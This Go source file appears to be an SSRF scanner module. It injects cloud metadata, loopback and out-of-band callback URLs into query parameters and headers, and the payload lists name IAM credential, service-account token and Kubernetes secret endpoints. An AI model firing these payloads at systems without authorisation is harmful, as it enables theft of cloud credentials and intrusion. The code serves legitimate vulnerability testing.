// Package ssrfprobe detects Server-Side Request Forgery (SSRF) vulnerabilities
// by injecting out-of-band (OOB) callback URLs and in-band cloud metadata
// endpoint payloads into every URL parameter and common header injection
// points. The detection strategy is inspired by:
//   - projectdiscovery/interactsh (Apache-2.0)  — OOB callback infrastructure
//   - projectdiscovery/nuclei templates (MIT)    — SSRF template patterns
//   - common SSRF research and public CVE write-ups
//
// License note: no source code is copied from interactsh or nuclei.
// The OOB callback approach, payload list, and detection heuristics are
// independently re-implemented under the blackhorn-modules MIT license.
package ssrfprobe

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/DonatoReis/blackhorn-modules/pkg/httpclient"
	"github.com/DonatoReis/blackhorn-modules/pkg/module"
	"golang.org/x/sync/errgroup"
)

const (
	maxBodyBytes   = 512 * 1024 // 512 KiB
	defaultConc    = 8
	defaultTimeout = 12 * time.Second
)

// ─── work item ───────────────────────────────────────────────────────────────

type workItem struct {
	rawURL  string
	param   string // query param name to inject; "" = header-only probe
	header  string // header name; non-empty for header injection probes
	payload string // injected value
	kind    string // "cloud", "oob", "header", "open-redirect-ssrf"
}

// ─── module ──────────────────────────────────────────────────────────────────

// Module implements module.Module for SSRF detection.
type Module struct {
	client      *http.Client
	concurrency int
	// OOBHost is an optional out-of-band callback server hostname.
	// If empty, only in-band (cloud metadata) detection is performed.
	// Format: "yourhost.oast.me" or similar interactsh-compatible host.
	OOBHost string
	// CloudOnly restricts probes to cloud metadata endpoints only (no header probes, no OOB).
	CloudOnly bool
}

// New returns a Module with production defaults.
func New() *Module {
	return &Module{
		client:      httpclient.New(httpclient.Options{Timeout: defaultTimeout}),
		concurrency: defaultConc,
	}
}

// NewWithClient creates a Module using the provided HTTP client (useful in tests).
func NewWithClient(c *http.Client) *Module {
	return &Module{
		client:      c,
		concurrency: defaultConc,
	}
}

// Name implements module.Module.
func (m *Module) Name() string { return "ssrfprobe" }

// Run implements module.Module.
// Accepts Target (single URL), URLs (slice) or RawContent (newline-delimited).
func (m *Module) Run(ctx context.Context, input module.Input) ([]module.Finding, error) {
	urls := collectURLs(input)
	if len(urls) == 0 {
		return nil, fmt.Errorf("ssrfprobe: no URLs provided")
	}

	// Generate a per-run unique nonce so OOB callbacks can be correlated.
	nonce, err := randomHex(8)
	if err != nil {
		return nil, fmt.Errorf("ssrfprobe: entropy error: %w", err)
	}

	var (
		mu       sync.Mutex
		findings []module.Finding
	)

	var work []workItem
	for _, rawURL := range urls {
		work = append(work, buildWorkItems(rawURL, nonce, m.OOBHost, m.CloudOnly)...)
	}

	g, gctx := errgroup.WithContext(ctx)
	g.SetLimit(m.concurrency)

	for _, wi := range work {
		wi := wi
		g.Go(func() error {
			f, skip := m.probe(gctx, wi)
			if skip {
				return nil
			}
			if f != nil {
				mu.Lock()
				findings = append(findings, *f)
				mu.Unlock()
			}
			return nil
		})
	}

	_ = g.Wait() // never returns error; probes swallow transport errors
	return findings, nil
}

// ─── probe ───────────────────────────────────────────────────────────────────

func (m *Module) probe(ctx context.Context, wi workItem) (*module.Finding, bool) {
	targetURL := wi.rawURL

	// For param injection, modify the query string.
	if wi.header == "" && wi.param != "" {
		injected, err := injectURL(wi.rawURL, wi.param, wi.payload)
		if err != nil {
			return nil, true
		}
		targetURL = injected
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
	if err != nil {
		return nil, true
	}

	// Header injection probe: inject payload into the specified header.
	if wi.header != "" {
		req.Header.Set(wi.header, wi.payload)
	}

	setUserAgent(req)

	resp, err := m.client.Do(req)
	if err != nil {
		return nil, true
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodyBytes))
	bodyStr := string(body)

	return m.evaluate(wi, resp.StatusCode, bodyStr, resp.Header)
}

func (m *Module) evaluate(wi workItem, code int, body string, headers http.Header) (*module.Finding, bool) {
	switch wi.kind {
	case "cloud":
		// In-band: response body contains cloud metadata markers.
		for _, marker := range cloudResponseMarkers {
			if strings.Contains(strings.ToLower(body), strings.ToLower(marker)) {
				return &module.Finding{
					Type:     "ssrf",
					URL:      wi.rawURL,
					Severity: module.SeverityCritical,
					Detail: fmt.Sprintf(
						"SSRF via cloud metadata endpoint: param=%q payload=%q triggered marker %q (HTTP %d)",
						wi.param, wi.payload, marker, code,
					),
					Extra: map[string]string{
						"check":      "cloud-metadata",
						"param":      wi.param,
						"payload":    wi.payload,
						"marker":     marker,
						"code":       fmt.Sprint(code),
						"confidence": "0.95", // metadata marker returned in response — definitive SSRF
					},
				}, false
			}
		}

	case "oob":
		// OOB callbacks are detected externally by the OOB server.
		// Log for visibility but do not emit a local finding.
		slog.Debug("ssrfprobe: OOB probe sent", "url", wi.rawURL, "param", wi.param, "payload", wi.payload)
		return nil, true

	case "header":
		// In-band header injection: metadata markers in response indicate SSRF.
		for _, marker := range cloudResponseMarkers {
			if strings.Contains(strings.ToLower(body), strings.ToLower(marker)) {
				return &module.Finding{
					Type:     "ssrf",
					URL:      wi.rawURL,
					Severity: module.SeverityHigh,
					Detail: fmt.Sprintf(
						"SSRF via header injection: header=%q payload=%q marker=%q (HTTP %d)",
						wi.header, wi.payload, marker, code,
					),
					Extra: map[string]string{
						"check":   "header-injection",
						"header":  wi.header,
						"payload": wi.payload,
						"marker":  marker,
						"code":    fmt.Sprint(code),
					},
				}, false
			}
		}

	case "open-redirect-ssrf":
		// 3xx redirect pointing to an internal address is a SSRF-adjacent issue.
		if code >= 300 && code < 400 {
			loc := headers.Get("Location")
			if isInternalURL(loc) {
				return &module.Finding{
					Type:     "ssrf",
					URL:      wi.rawURL,
					Severity: module.SeverityHigh,
					Detail: fmt.Sprintf(
						"Open redirect to internal resource: param=%q redirects to %q (HTTP %d)",
						wi.param, loc, code,
					),
					Extra: map[string]string{
						"check":    "open-redirect-ssrf",
						"param":    wi.param,
						"payload":  wi.payload,
						"location": loc,
						"code":     fmt.Sprint(code),
					},
				}, false
			}
		}
	}

	return nil, true
}

// ─── work item builder ───────────────────────────────────────────────────────

func buildWorkItems(rawURL, nonce, oobHost string, cloudOnly bool) []workItem {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}

	params := queryParamNames(parsed)
	if len(params) == 0 {
		// Inject into common SSRF-prone parameter names when none are present.
		params = []string{"url", "path", "redirect", "next", "target", "dest", "uri", "endpoint"}
	}

	var items []workItem

	// Cloud metadata payloads — in-band detection, no OOB required.
	for _, param := range params {
		for _, p := range cloudMetadataPayloads {
			items = append(items, workItem{
				rawURL:  rawURL,
				param:   param,
				payload: p,
				kind:    "cloud",
			})
		}
		// Open redirect → SSRF: inject internal addresses into redirect params.
		for _, p := range internalRedirectPayloads {
			items = append(items, workItem{
				rawURL:  rawURL,
				param:   param,
				payload: p,
				kind:    "open-redirect-ssrf",
			})
		}
	}

	if !cloudOnly {
		// Header injection probes — in-band cloud metadata detection via headers.
		for _, h := range ssrfHeaderInjectionTargets {
			for _, p := range cloudMetadataPayloads {
				items = append(items, workItem{
					rawURL:  rawURL,
					header:  h,
					payload: p,
					kind:    "header",
				})
			}
		}

		// OOB probes — only emitted when an OOB callback host is configured.
		if oobHost != "" {
			for _, param := range params {
				for _, tmpl := range oobPayloadTemplates {
					payload := fmt.Sprintf(tmpl, nonce, oobHost)
					items = append(items, workItem{
						rawURL:  rawURL,
						param:   param,
						payload: payload,
						kind:    "oob",
					})
				}
			}
		}
	}

	return items
}

// ─── helpers ─────────────────────────────────────────────────────────────────

func collectURLs(input module.Input) []string {
	seen := make(map[string]struct{})
	var out []string
	add := func(s string) {
		s = strings.TrimSpace(s)
		if s == "" {
			return
		}
		if _, ok := seen[s]; !ok {
			seen[s] = struct{}{}
			out = append(out, s)
		}
	}
	if input.Target != "" {
		add(input.Target)
	}
	for _, u := range input.URLs {
		add(u)
	}
	if input.RawContent != "" {
		for _, line := range strings.Split(input.RawContent, "\n") {
			add(line)
		}
	}
	return out
}

// injectURL replaces (or adds) param=payload in the URL query string.
func injectURL(rawURL, param, payload string) (string, error) {
	if param == "" {
		return rawURL, nil
	}
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return "", err
	}
	q := parsed.Query()
	q.Set(param, payload)
	parsed.RawQuery = q.Encode()
	return parsed.String(), nil
}

func queryParamNames(u *url.URL) []string {
	q := u.Query()
	names := make([]string, 0, len(q))
	for k := range q {
		names = append(names, k)
	}
	return names
}

// isInternalURL returns true if loc points to a loopback, RFC-1918 or
// cloud-metadata address.
func isInternalURL(loc string) bool {
	if loc == "" {
		return false
	}
	lower := strings.ToLower(loc)
	for _, prefix := range internalPrefixes {
		if strings.HasPrefix(lower, prefix) {
			return true
		}
	}
	return false
}

func randomHex(n int) (string, error) {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func setUserAgent(req *http.Request) {
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; blackhorn-ssrfprobe/1.0)")
	}
}

// ─── payload databases ───────────────────────────────────────────────────────

// cloudMetadataPayloads contains well-known cloud IMDS (Instance Metadata Service)
// endpoints across AWS, GCP, Azure, Alibaba Cloud, DigitalOcean, and Oracle Cloud.
var cloudMetadataPayloads = []string{
	// AWS IMDSv1 (unauthenticated)
	"http://169.254.169.254/latest/meta-data/",
	"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
	"http://169.254.169.254/latest/meta-data/hostname",
	"http://169.254.169.254/latest/user-data",
	"http://169.254.169.254/latest/api/token",
	// AWS ECS credential endpoint
	"http://169.254.170.2/v2/credentials",
	// GCP IMDS
	"http://metadata.google.internal/computeMetadata/v1/",
	"http://169.254.169.254/computeMetadata/v1/instance/",
	"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
	// Azure IMDS
	"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
	"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
	// Alibaba Cloud ECS
	"http://100.100.100.200/latest/meta-data/",
	// DigitalOcean Droplet Metadata
	"http://169.254.169.254/metadata/v1/",
	// Oracle Cloud IMDS
	"http://169.254.169.254/opc/v1/instance/",
	// Kubernetes service account token
	"file:///var/run/secrets/kubernetes.io/serviceaccount/token",
	// Docker daemon API (common in misconfigured hosts)
	"http://172.17.0.1:2375/version",
	// Loopback — tests whether server fetches arbitrary local endpoints
	"http://127.0.0.1/",
	"http://localhost/",
}

// cloudResponseMarkers are unique strings present in authentic IMDS responses
// that virtually never appear in normal application responses.
var cloudResponseMarkers = []string{
	// AWS
	"ami-id",
	"instance-id",
	"iam/security-credentials",
	"placement/availability-zone",
	"latest/meta-data",
	// GCP
	"computeMetadata",
	"project-id",
	"numeric-project-id",
	// Azure
	"azEnvironment",
	"subscriptionId",
	"resourceGroupName",
	// Kubernetes
	"kubernetes.io",
	"serviceaccount",
	// Docker
	"ApiVersion",
	// Generic cloud indicator
	"169.254.169.254",
	"metadata.google.internal",
}

// internalRedirectPayloads are URLs that point to internal/loopback resources.
// A 3xx redirect to these indicates potential SSRF via open redirect.
var internalRedirectPayloads = []string{
	"http://169.254.169.254/",
	"http://127.0.0.1/",
	"http://localhost/",
	"http://0.0.0.0/",
	"http://[::1]/",
}

// ssrfHeaderInjectionTargets are HTTP headers commonly abused in SSRF attacks
// where the application uses the header value to construct backend requests.
// Reference pattern: nuclei-templates/http/ssrf/
var ssrfHeaderInjectionTargets = []string{
	"X-Forwarded-For",
	"X-Forwarded-Host",
	"X-Forwarded-Server",
	"X-Real-IP",
	"X-Custom-IP-Authorization",
	"X-Original-URL",
	"X-Rewrite-URL",
	"X-Host",
	"Referer",
	"True-Client-IP",
	"CF-Connecting-IP",
	"X-ProxyUser-Ip",
}

// oobPayloadTemplates are format strings where %s[0]=nonce and %s[1]=oobHost.
// Inspired by interactsh OOB URL conventions.
var oobPayloadTemplates = []string{
	"http://%s.%s/",
	"http://%s.%s/ssrf",
	"https://%s.%s/",
}

// internalPrefixes are URL prefixes indicating loopback, RFC-1918, or IMDS addresses.
var internalPrefixes = []string{
	"http://169.254.",
	"http://127.",
	"http://localhost",
	"http://0.0.0.0",
	"http://[::1]",
	"http://10.",
	"http://172.16.",
	"http://172.17.",
	"http://172.18.",
	"http://172.19.",
	"http://172.20.",
	"http://172.21.",
	"http://172.22.",
	"http://172.23.",
	"http://172.24.",
	"http://172.25.",
	"http://172.26.",
	"http://172.27.",
	"http://172.28.",
	"http://172.29.",
	"http://172.30.",
	"http://172.31.",
	"http://192.168.",
	"file://",
}
